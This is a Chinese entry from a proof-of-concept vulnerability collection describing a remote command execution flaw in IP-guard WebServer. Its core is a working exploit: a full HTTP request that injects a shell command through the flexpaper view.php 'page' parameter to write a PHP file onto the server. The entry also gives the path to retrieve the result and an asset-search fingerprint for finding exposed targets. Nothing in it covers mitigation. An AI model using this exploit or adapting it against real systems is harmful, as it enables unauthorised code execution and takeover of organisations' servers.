---
fofa: "web.icon=="
source: "wy876 漏洞文库"
---

# IP-guard WebServer 远程命令执行漏洞

# 一、漏洞简介
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。IP-guard WebServer 存在远程命令执行漏洞。攻击者可利用该漏洞执行任意命令，获取服务器控制权限。

# 二、影响版本
+ IP-guard

# 三、资产测绘
+ hunter`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
+ 特征


# 四、漏洞复现
```plain
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+phpinfo();+?^>+>2.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ipg_session=uiki60dds9f9jop2jpj0vn8h22aa3e1o
Upgrade-Insecure-Requests: 1
```


获取命令执行结果

```plain
/ipg/static/appr/lib/flexpaper/php/2.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/opebo53vl523fg3s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
